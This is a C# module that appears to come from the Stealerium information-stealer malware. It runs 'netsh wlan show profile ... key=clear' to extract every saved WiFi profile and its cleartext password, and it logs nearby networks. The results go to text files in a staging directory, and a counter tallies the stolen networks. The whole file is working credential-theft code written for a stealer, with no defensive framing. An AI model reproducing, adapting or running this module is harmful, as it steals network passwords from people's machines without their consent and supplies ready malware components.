using System;
using System.IO;
using System.Linq;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class Wifi
    {
        // Get WiFi profile names
        private static string[] GetProfiles()
        {
            var output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
            var wNames = output.Split(new[] {'\r', '\n'}, StringSplitOptions.RemoveEmptyEntries);
            for (var i = 0; i < wNames.Length; i++)
                wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
            return wNames;
        }

        // Get Wifi password by profile name
        private static string GetPassword(string profile)
        {
            var output =
                CommandHelper.Run(
                    $"/C chcp 65001 && netsh wlan show profile name=\"{profile}\" key=clear | findstr Key");
            return output.Split(':').Last().Trim();
        }

        // Save all wifi networks to file
        public static void ScanningNetworks(string sSavePath)
        {
            var output = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");
            if (!output.Contains("is not running"))
                File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", output);
        }

        // Save wifi networks with passwords to file
        public static void SavedNetworks(string sSavePath)
        {
            var profiles = GetProfiles();
            foreach (var profile in profiles)
            {
                // Skip
                if (profile.Equals("65001"))
                    continue;

                Counter.SavedWifiNetworks++;
                var pwd = GetPassword(profile);
                var fmt = $"PROFILE: {profile}\nPASSWORD: {pwd}\n\n";
                File.AppendAllText(sSavePath + "\\SavedNetworks.txt", fmt);
            }
        }
    }
}